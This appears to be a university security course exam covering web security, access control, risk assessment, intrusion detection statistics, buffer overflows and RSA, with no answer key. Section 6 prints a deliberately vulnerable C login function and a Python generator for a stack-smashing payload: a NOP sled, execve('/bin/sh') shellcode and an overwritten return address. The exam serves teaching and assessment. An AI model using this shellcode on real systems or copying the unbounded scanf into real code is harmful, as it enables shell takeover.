# Security Quiz

---

## 1. True / False (1.0p each)

**1a.** Mixing of data and code is the main reason for SQL injection attacks.
- [ ] True
- [ ] False

**1b.** HTTP is a stateless protocol.
- [ ] True
- [ ] False

**1c.** Same-origin policy prevents stealing cookies on the server side.
- [ ] True
- [ ] False

**1d.** Message Authentication Codes may use cryptographic hash functions.
- [ ] True
- [ ] False

**1e.** Return-to-libc attacks can be mitigated with Control Flow Integrity.
- [ ] True
- [ ] False

**1f.** TLS can be used to protect cookies from theft.
- [ ] True
- [ ] False

**1g.** Browser fingerprinting techniques rely on cookies exchanged in the HTTP headers.
- [ ] True
- [ ] False

**1h.** Access control (access to friend lists, photos, posts, etc.) on social networks is usually implemented as the Mandatory Access Control scheme.
- [ ] True
- [ ] False

**1i.** It is safe to post your public key on public websites and give it to strangers: your communication is secure even if the adversary knows this key.
- [ ] True
- [ ] False

**1j.** Signature-based IDSs are called as such because they recognize an attack based on the public key signature of the source host.
- [ ] True
- [ ] False

---

## 2. Multi-select (1.0p each)

> To get the full mark you need to select all correct answers and none of the incorrect answers. Multiple (or no) answers can be correct.

**2a.** Which security goals are violated in the following scenario?

> We discovered that Brightspace allows all students to see grades of all other students. The issue has been traced to a former administrator.

- [ ] Confidentiality
- [ ] Accountability
- [ ] Integrity
- [ ] Availability
- [ ] Non-repudiation
- [ ] Authorization
- [ ] Authenticity
- [ ] Accuracy

**2b.** What can users do to protect themselves from being tracked by websites?
- [ ] Use evercookie.
- [ ] Use adblocker.
- [ ] Clear browsing data.
- [ ] Frequently change passwords.
- [ ] Disable third-party cookies.
- [ ] Enable third-party cookies.

**2c.** Which steps does the attacker need to do for a stack smashing attack?
- [ ] Load the shellcode on the stack.
- [ ] Find a vulnerable code function.
- [ ] Find location of the buffer on the stack.
- [ ] Find the shellcode on the stack.
- [ ] Find the stack.
- [ ] Find the value of the stored `%rip`.
- [ ] Find one or more `nop` instruction(s).

**2d.** Which of the following security goals are ensured by TLS?
- [ ] Confidentiality of messages.
- [ ] Integrity of messages.
- [ ] Authenticity of messages.
- [ ] Authenticity of parties (client and server).
- [ ] Confidentiality of parties (client and server).

**2e.** Which of the following represent valid two-factor authentication methods?
- [ ] voice pattern and movement pattern
- [ ] PIN and fingerprint
- [ ] PIN and password
- [ ] token and password
- [ ] voice pattern and token

---

## 3. Short answers (5.0p each)

> Answer these questions in a few (2–5) sentences.

**3a.** Name and explain the four (4) main strategies for treating/managing security risks (what can we do with a security risk).

**3b.** Explain what is Discretionary Access Control.

**3c.** Explain the goal(s) of Control Flow Integrity and how it is ensured.

**3d.** Explain how reflected Cross-Site Scripting attacks work.

**3e.** Explain the repudiation, information disclosure and denial of service threats in the STRIDE approach and state which security goals each of them violates.

**3f.** The main steps of accessing a system are (1) identification; (2) authentication; (3) authorization. Explain what each of these steps means.

**3g.** In UNIX-based systems, a user with respect to a resource can be (1) owner; (2) group; (3) world. Explain why these three categories exist (instead of only 1 or 2) and give an example of a resource where having the three of them is useful.

**3h.** Identify 3 main locations from which cookies could be stolen, and propose 1 countermeasure to protect each of those (3 countermeasures in total).

**3i.** Using Caesar Cipher, with encryption key = 3, the ciphertext `zhoo grqh` decrypts to:

---

## 4. Analysis — Risk assessment (GitHub) (2.0p each)

> These questions require longer but still concise answers. Provide justifications whenever you make conclusions, and list any assumptions you make.
>
> Consider the GitHub platform (github.com) that is used by millions of developers to store their code.

**4a.** Identify three (3) important assets for GitHub.

**4b.** Identify three (3) threat scenarios that can have impact on the service owner (GitHub).

**4c.** Discuss how the identified assets can be impacted by these three (3) threat scenarios.

**4d.** Quantify these three (3) risks by estimating their likelihood and impact.

**4e.** Discuss one countermeasure per risk identified in (d), i.e., three (3) in total. Countermeasures can already be implemented or not yet implemented.

---

## 5. Analysis — Base Rate Fallacy

> You are Head of Security in a small company. To detect potential attacks you have a powerful intrusion detection system that sends alerts directly to your phone. The system you are currently using is switching to a monthly subscription model with fees you can no longer afford.
>
> You look into free and open-source alternatives: the first is called **AdvanceDetectSyst**, the second **B3S4fe**. You set out to test them.
>
> You handcraft **10** malicious packets representative of all possible attacks your company might witness. Out of those ten, AdvanceDetectSyst recognises (alerts on) only **2**. B3S4fe recognises **9**.
>
> You also grab **1,000,000 (10⁶)** packets that are surely benign traffic. When analysing those million, AdvanceDetectSyst sends only **1** alert. B3S4fe sends **50** alerts instead.
>
> Your company sees a lot of traffic and you estimate that on average **1** packet in every **100,000 (10⁵)** is actually malicious.

**5a. (2.5p)** What is the probability (in percentage, 0–100, rounded to nearest whole number) that when AdvanceDetectSyst sends an alert it corresponds to actual malicious activity?

**5b. (2.5p)** What is the probability (in percentage, 0–100, rounded to nearest whole number) that when B3S4fe sends an alert it corresponds to actual malicious activity?

**5c. (5.0p)** Which one of these two softwares would you choose for your company? And why? Provide a choice and a short list of arguments.

---

## 6. Analysis — Vulnerable program

> These questions require longer but still concise answers. Provide justifications whenever you make conclusions, and list any assumptions you make.
>
> A vulnerable C program runs on a machine. Its code snippet is below. Assume that the comments are replaced with bug-free and correct code that is not relevant to this question.

```c
#include <stdio.h>

int authorized() {
    char username[128];

    printf("Login: ");
    scanf("%s", username);
    // Omitted: some logic to check username and password,
    // return 1 if the user is authorized
}

int main()
{
    printf("!!!Authorized users only!!!\n");
    if (authorized()) {
        // Omitted: do something
    }
    // Omitted: something else.
}
```

> An attacker uses the following python program to generate their "username".

```python
import sys
sys.stdout.buffer.write(
    # Element A:
    b"\x90" * 70 +
    # Element B:
    b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1" +
    b"\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" +
    # Element C:
    b"\x42" * 36 +
    b"\x70\xec\xff\xff\xff\x7f"
)
```

**6a. (7.5p)** Explain what is the content of each of the marked "elements", and how they help to exploit the vulnerability.

**6b. (2.5p)** How can you protect against this vulnerability? Point to which lines in the C program should be changed and explain how they should be changed.

---

## 7. Analysis — RSA

> These questions require longer but still concise answers. Provide justifications whenever you make conclusions, and list any assumptions you make.
>
> Alice and Bob communicate using the RSA algorithm. Alice's private key consists of p = 5 and q = 7. The first part of Alice's public key is e = 5.

**7a. (1.0p)** Give the formula for *n*, the other part of Alice's public key.

**7b. (1.0p)** Calculate *n*, the other part of Alice's public key.

**7c. (1.0p)** Give the formula for λ.

**7d. (1.0p)** What is the value of λ?

**7e. (1.0p)** Give the formula for *d*.

**7f. (2.0p)** What is the value of *d*?

**7g. (1.0p)** Give the formula for computing a ciphertext *c* from a message *m*.

**7h. (2.0p)** Bob wants to send the message m = 2 to Alice. Calculate the ciphertext *c*.

---

## 8. Space for comments (0.0p, optional, not graded)

You can use this question to write explanations about any of the previous questions, if needed — for example, to explain your reasoning in case you find a question ambiguous.
